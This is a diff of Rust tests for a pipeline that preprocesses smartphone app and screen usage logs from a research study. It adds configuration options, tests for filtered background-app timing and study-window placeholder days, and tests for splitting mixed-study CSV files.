             timezone: "America/Chicago".into(),
             timezone_handling: "selected-convert".into(),
             usage_session_mode: UsageSessionMode::AppAndScreenUsage,
+            screen_session_construction_strategy: ScreenSessionConstructionStrategyId::default(),
+            screen_session_construction_strategy_explicit: false,
+            screen_session_classification_policy: ScreenSessionClassificationPolicy::None,
+            screen_session_maximum_duration_minutes: 0.0,
+            screen_session_maximum_duration_disposition:
+                ScreenSessionMaximumDurationDisposition::None,
+            locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
+            episode_reconstruction_strategy: EpisodeReconstructionStrategy::FusedMatcher,
+            opener_set: OpenerSet::StrategyDefined,
+            interval_quality_policy: IntervalQualityPolicy::None,
+            session_grouping_policy: SessionGroupingPolicy::None,
+            session_gap_basis: SessionGapBasis::default(),
+            session_boundary_scope: SessionBoundaryScope::default(),
+            emit_session_break_lineage: false,
+            event_retention_set: EventRetentionSet::None,
+            maximum_duration: b06::MaximumDurationRequest::default(),
             include_app_output: true,
             include_screen_output: true,
             use_filter_file: true,
@@ -13641,6 +14556,7 @@ mod output_contract {
             use_app_codebook: true,
             include_category_column: true,
             deduplicate_exact_rows: true,
+            drop_out_of_source_order_events: false,
             interaction_type_remap: Vec::new(),
             correct_duplicate_event_timestamps: true,
             allow_stop_event_reuse: false,
@@ -13654,13 +14570,21 @@ mod output_contract {
             same_app_stop_types: vec!["Activity Paused".into(), "Activity Resumed".into()],
             other_stop_types: vec!["Activity Resumed".into(), "Device Shutdown".into()],
             interaction_types_to_remove: Vec::new(),
+            interaction_type_removal_mode: InteractionTypeRemovalMode::GapPreserving,
             screen_auto_lock_timeout_seconds: 120.0,
             screen_auto_lock_tolerance_seconds: 30.0,
             screen_manual_lock_max_tail_seconds: 30.0,
             screen_keyguard_near_stop_seconds: 2.0,
             datetime_of_preprocessing: "2026-07-21 12:00:00 UTC".into(),
             model_concurrent_usage: true,
+            micro_use_classification_policy: MicroUseClassificationPolicy::None,
+            micro_use_classification_policy_explicit: false,
             minimum_usage_duration: 60.0,
+            minimum_usage_duration_explicit: false,
+            minimum_duration_comparator: MinimumDurationComparator::StrictLt,
+            minimum_duration_comparator_explicit: false,
+            minimum_duration_disposition: MinimumDurationDisposition::ChronicleBlankKeepRow,
+            minimum_duration_disposition_explicit: false,
             apply_minimum_usage_duration_to_concurrent_subintervals: true,
             filter_zero_duration_sessions: true,
             add_no_activity_placeholder_days: true,
@@ -13672,11 +14596,23 @@ mod output_contract {
             enable_screen_gated_crediting: true,
             enable_aggregates: true,
             aggregate_shape: "wide".into(),
+            aggregate_top_apps_limit: 0,
+            enable_participant_amount_summary: true,
             materialize_visualization_data: true,
             credited_session_cap_minutes: 360.0,
             device_liveness_gap_tolerance_minutes: 120.0,
             auto_lock_bridge_seconds: 120.0,
             no_witness_min_day_apps: 2,
+            screen_gating_rule: ScreenGatingRule::default(),
+            day_boundary_attribution: DayBoundaryAttribution::default(),
+            filter_match_field: FilterMatchField::AppPackageName,
+            application_label_exclusions: Vec::new(),
+            package_exclusion_preset: PackageExclusionPreset::AllSuppliedRows,
+            notification_proxy_rule: NotificationProxyRule::None,
+            polled_emulation_method: PolledEmulationMethod::None,
+            polled_emulation_interval_seconds: 10.0,
+            polled_emulation_gap_seconds: 15.0,
+            interval_expansion_method: IntervalExpansionMethod::None,
         }
     }
 
@@ -13690,12 +14626,106 @@ mod output_contract {
             device_sharing_csv: DEVICE_SHARING_CSV,
             survey_attribution_csv: SURVEY_ATTRIBUTION_CSV,
             enrolled_devices_csv: ENROLLED_DEVICES_CSV,
+            ..PipelineV2SupportFiles::default()
         }
     }
 
     fn run_contract_fixture() -> PipelineV2Result {
         run_pipeline_v2_with_supports(FIXTURE_CSV.as_bytes(), &contract_options(), support_files())
             .expect("the contract fixture must preprocess cleanly")
+    }
+
+    /// A package on both the filter list and the background list is published
+    /// as Filtered App Background Usage with its real timing. Classification
+    /// used to label it Filtered App Usage and blank its timing before the
+    /// inclusion policy looked at the background list, so the label was never
+    /// produced for a reconstructed episode and the row carried no times.
+    #[test]
+    fn a_filtered_background_app_keeps_its_timing_under_its_own_label() {
+        let filter: &[u8] = b"app_package_name,known_application_labels\ncom.example.secret,Secret\ncom.example.video,Video\n";
+        let result = run_pipeline_v2_with_supports(
+            FIXTURE_CSV.as_bytes(),
+            &contract_options(),
+            PipelineV2SupportFiles {
+                filter_csv: filter,
+                ..support_files()
+            },
+        )
+        .expect("the fixture preprocesses with the video app on both lists");
+        let bytes = result.app_csv_bytes.to_vec();
+        let mut reader = csv::Reader::from_reader(bytes.as_slice());
+        let headers = reader.headers().expect("app csv header").clone();
+        let column = |name: &str| {
+            headers
+                .iter()
+                .position(|header| header == name)
+                .unwrap_or_else(|| panic!("app csv has no {name} column"))
+        };
+        let (kind, package, start, stop) = (
+            column("interaction_type"),
+            column("app_package_name"),
+            column("start_timestamp"),
+            column("stop_timestamp"),
+        );
+        // Episode rows only: the raw Activity Stopped event of a filtered app
+        // is published as Filtered App Stopped and never carries timing.
+        let episodes: Vec<csv::StringRecord> = reader
+            .records()
+            .map(|record| record.expect("app csv row"))
+            .filter(|record| {
+                &record[package] == "com.example.video" && &record[kind] != "Filtered App Stopped"
+            })
+            .collect();
+        assert!(!episodes.is_empty(), "the video episodes were dropped");
+        for record in &episodes {
+            assert_eq!(&record[kind], "Filtered App Background Usage");
+            assert!(!record[start].is_empty(), "start timestamp was blanked");
+            assert!(!record[stop].is_empty(), "stop timestamp was blanked");
+        }
+    }
+
+    /// A raw day the study-window filter removed must not come back as a
+    /// no-activity placeholder. Placeholder candidates come from the raw rows,
+    /// which the filter never touches, so every out-of-window day with any raw
+    /// event used to re-enter the app table as `com.placeholder.noactivity`.
+    #[test]
+    fn placeholder_days_respect_the_study_window() {
+        let raw = format!(
+            "{FIXTURE_CSV}{}",
+            "Study,P01,Target Child,,Screen Interactive,,2026-03-10 09:00:00,America/Chicago\n",
+        );
+        let placeholder_dates = |options: &PipelineV2Options| -> Vec<String> {
+            let result = run_pipeline_v2_with_supports(raw.as_bytes(), options, support_files())
+                .expect("the fixture preprocesses with an out-of-window raw day");
+            let bytes = result.app_csv_bytes.to_vec();
+            let mut reader = csv::Reader::from_reader(bytes.as_slice());
+            let headers = reader.headers().expect("app csv header").clone();
+            let column = |name: &str| {
+                headers
+                    .iter()
+                    .position(|header| header == name)
+                    .unwrap_or_else(|| panic!("app csv has no {name} column"))
+            };
+            let (package, date) = (column("app_package_name"), column("date"));
+            reader
+                .records()
+                .map(|record| record.expect("app csv row"))
+                .filter(|record| &record[package] == "com.placeholder.noactivity")
+                .map(|record| record[date].to_string())
+                .collect()
+        };
+        let windowed = contract_options();
+        assert!(windowed.enable_study_window_filter && windowed.add_no_activity_placeholder_days);
+        assert!(
+            !placeholder_dates(&windowed).contains(&"2026-03-10".to_string()),
+            "an out-of-window day came back as a placeholder",
+        );
+        let mut unwindowed = contract_options();
+        unwindowed.enable_study_window_filter = false;
+        assert!(
+            placeholder_dates(&unwindowed).contains(&"2026-03-10".to_string()),
+            "without the window filter the raw-only day is a placeholder",
+        );
     }
 
     /// The codebook alias columns are the derived category columns that stand
@@ -13735,12 +14765,14 @@ mod output_contract {
         let without_codebook = run_pipeline_v2(FIXTURE_CSV.as_bytes(), &options, none, none, none)
             .expect("the fixture preprocesses with the codebook enabled and absent");
         assert_eq!(
-            header_of(&without_codebook.app_csv_bytes),
+            header_of(&without_codebook.app_csv_bytes.to_vec()),
             declared_app_output_columns(
                 true,
                 true,
                 usage_layer_active,
                 options.custom_app_engagement_duration,
+                options.include_app_usage_end_reason,
+                options.session_grouping_policy != SessionGroupingPolicy::None,
             ),
             "an enabled codebook with no rows to join dropped the alias columns",
         );
@@ -13749,12 +14781,14 @@ mod output_contract {
             run_pipeline_v2(FIXTURE_CSV.as_bytes(), &options, none, none, CODEBOOK_CSV)
                 .expect("the fixture preprocesses with a codebook");
         assert_eq!(
-            header_of(&with_codebook.app_csv_bytes),
+            header_of(&with_codebook.app_csv_bytes.to_vec()),
             declared_app_output_columns(
                 true,
                 false,
                 usage_layer_active,
                 options.custom_app_engagement_duration,
+                options.include_app_usage_end_reason,
+                options.session_grouping_policy != SessionGroupingPolicy::None,
             ),
             "a joined codebook still emitted the alias columns",
         );
@@ -14036,15 +15070,15 @@ mod output_contract {
     #[test]
     fn product_csv_and_json_outputs_are_exact() {
         let result = run_contract_fixture();
-        assert_golden("app.csv", &result.app_csv_bytes);
-        assert_golden("screen.csv", &result.screen_csv_bytes);
-        assert_golden("credited_app.csv", &result.credited_app_csv_bytes);
-        assert_golden("day_coverage.csv", &result.day_coverage_csv_bytes);
-        assert_golden("compliance.csv", &result.compliance_csv_bytes);
-        assert_golden("review_summary.json", &result.review_summary_json_bytes);
+        assert_golden("app.csv", &result.app_csv_bytes.to_vec());
+        assert_golden("screen.csv", &result.screen_csv_bytes.to_vec());
+        assert_golden("credited_app.csv", &result.credited_app_csv_bytes.to_vec());
+        assert_golden("day_coverage.csv", &result.day_coverage_csv_bytes.to_vec());
+        assert_golden("compliance.csv", &result.compliance_csv_bytes.to_vec());
+        assert_golden("review_summary.json", &result.review_summary_json_bytes.to_vec());
         assert_golden(
             "visualization_data.json",
-            &result.visualization_data_json_bytes,
+            &result.visualization_data_json_bytes.to_vec(),
         );
         let kinds = result
             .aggregate_csv_outputs
@@ -14053,7 +15087,7 @@ mod output_contract {
             .collect::<Vec<_>>();
         assert_golden("aggregate_kinds.json", format!("{kinds:?}").as_bytes());
         for output in result.aggregate_csv_outputs.iter() {
-            assert_golden(&format!("{}.csv", output.kind), &output.bytes);
+            assert_golden(&format!("{}.csv", output.kind), &output.bytes.to_vec());
         }
     }
 
@@ -14114,5 +15148,72 @@ mod output_contract {
             .expect("counts serialize")
             .as_bytes(),
         );
+    }
+}
+
+#[cfg(test)]
+mod study_split {
+    use super::*;
+
+    const MIXED: &str = concat!(
+        "study_id,participant_id,note,interaction_type,app_package_name,event_timestamp,timezone\n",
+        "A,P01,\"a, quoted\nnote\",Activity Resumed,pkg,2026-03-07 10:00:00,UTC\n",
+        "B,P01,x,Activity Paused,pkg,2026-03-07 10:05:00,UTC\n",
+        ",P01,y,Activity Resumed,pkg,2026-03-07 10:06:00,UTC\n",
+        " A ,P02,z,Activity Paused,pkg,2026-03-07 10:07:00,UTC\n",
+    );
+
+    fn decoded(bytes: &[u8]) -> Vec<(String, String, String, String)> {
+        incremental::decode_source_records(bytes)
+            .into_iter()
+            .map(|row| (row.study_id, row.participant_id, row.event_timestamp, row.interaction_type))
+            .collect()
+    }
+
+    #[test]
+    fn a_mixed_study_file_splits_into_parts_the_decoder_reads_back_exactly() {
+        let studies = raw_study_ids_to_split(MIXED.as_bytes());
+        assert_eq!(studies, ["", "A", "B"]);
+        let original = decoded(MIXED.as_bytes());
+        let mut reassembled = Vec::new();
+        let parts = split_raw_by_study(MIXED.as_bytes());
+        assert_eq!(parts.iter().map(|(study, _)| study.as_str()).collect::<Vec<_>>(), studies);
+        for (study, part) in &parts {
+            let rows = decoded(part);
+            assert!(!rows.is_empty() && rows.iter().all(|row| row.0 == *study));
+            let expected: Vec<_> = original.iter().filter(|row| row.0 == *study).cloned().collect();
+            assert_eq!(rows, expected, "part {study:?} keeps its rows in source order");
+            reassembled.extend(rows);
+        }
+        assert_eq!(reassembled.len(), original.len(), "every row lands in exactly one part");
+        let part_a = String::from_utf8(parts[1].1.clone()).unwrap();
+        assert!(part_a.starts_with("study_id,participant_id,note,"));
+        assert!(part_a.contains("\"a, quoted\nnote\""), "columns the decoder skips are kept");
+    }
+
+    #[test]
+    fn the_splitter_finds_a_padded_or_marked_study_header_the_decoder_reads() {
+        for header in ["\u{feff}study_id", " study_id "] {
+            let csv = format!(
+                "{header},participant_id,event_timestamp\nA,P01,2026-03-07 10:00:00\nB,P01,2026-03-07 10:02:00\n"
+            );
+            assert_eq!(raw_study_ids_to_split(csv.as_bytes()), ["A", "B"], "{header:?}");
+        }
+    }
+
+    #[test]
+    fn a_single_study_file_is_never_split_and_keys_carry_the_study() {
+        let single = "study_id,participant_id,event_timestamp\nA,P01,2026-03-07 10:00:00\n,P01,2026-03-07 10:01:00\n";
+        assert!(split_raw_by_study(single.as_bytes()).is_empty());
+        assert_eq!(
+            canonical_raw_participant_keys(single.as_bytes()).into_iter().collect::<Vec<_>>(),
+            [("A".to_string(), "P01".to_string())],
+            "blank study cells in a single-study file belong to that study"
+        );
+        assert!(raw_study_ids_to_split(b"participant_id,event_timestamp\nP01,2026-03-07 10:00:00\n").is_empty());
+        let keys = canonical_raw_participant_keys(MIXED.as_bytes());
+        let expected = [("", "P01"), ("A", "P01"), ("A", "P02"), ("B", "P01")]
+            .map(|(study, participant)| (study.to_string(), participant.to_string()));
+        assert_eq!(keys.into_iter().collect::<Vec<_>>(), expected);
     }
 }
